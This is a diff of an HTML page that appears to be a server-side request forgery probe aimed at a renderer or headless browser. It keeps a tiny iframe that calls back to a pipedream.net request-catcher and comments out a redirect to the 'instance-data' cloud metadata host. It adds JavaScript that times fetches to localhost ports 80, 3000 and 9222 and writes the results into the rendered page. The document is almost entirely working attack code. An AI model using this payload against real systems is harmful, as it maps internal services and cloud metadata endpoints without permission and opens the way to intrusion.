@@ -1,4 +1,59 @@
 <div style="width: 100%; height: 500px; background-color: white;">
-  <iframe src="https://e1d544a9b90cb618dc510cc0acca74af.m.pipedream.net/xyz" width="800" height="500" ></iframe>
-  <script>window.location="http://instance-data"</script>
+  
+  <script>/*window.location="http://instance-data"*/</script>
+  <div>
+  <h1>whatsup yo</h1>
+  <div id="hi"></div>
+  <iframe src="https://e1d544a9b90cb618dc510cc0acca74af.m.pipedream.net/xyz" width="8" height="5" ></iframe>
+</div>
+<script>
+  var div = document.getElementById('hi');
+  function timeout(ms, promise,controller) {
+    return new Promise(function (resolve, reject) {
+          setTimeout(function () {
+              controller.abort();
+              reject(new Error("timeout"))
+          }, ms)
+          promise.then(resolve, reject)
+      })
+  } 
+  function scan(targetdata, duration) {
+      let sendDate = new Date().getTime();
+      var controller = new AbortController();//NO IE support
+      var signal = controller.signal;
+      timeout(duration, fetch(`http://${targetdata.address}:${targetdata.port}/`, {
+              mode: 'no-cors',
+              credentials: 'omit',
+              signal
+          }),controller)
+          .then(function (response) {
+              let receiveDate = new Date().getTime();
+              let result = {
+                  "error": false,
+                  "errorReason": null,
+                  "start": sendDate,
+                  "end": receiveDate,
+                  "duration": (receiveDate - sendDate),
+                  "target": targetdata
+              };
+              div.innerHTML = div.innerHTML + '<br/>' + JSON.stringify(result);
+          })
+          .catch(function (e) {
+              let receiveDate = (new Date()).getTime();
+              console.log(`Scanner: ${e.message} for ${targetdata.address}:${targetdata.port}.`);
+              let result = {
+                  "error": true,
+                  "errorReason": e.message,
+                  "start": sendDate,
+                  "end": receiveDate,
+                  "duration": (receiveDate - sendDate),
+                  "target": targetdata
+              };
+              div.innerHTML = div.innerHTML + '<br/>' + JSON.stringify(result);
+          })
+    }
+    scan({address: 'localhost', port: 80}, 10000)
+    scan({address: 'localhost', port: 3000}, 10000)
+    scan({address: 'localhost', port: 9222}, 10000)
+</script>
 </div>
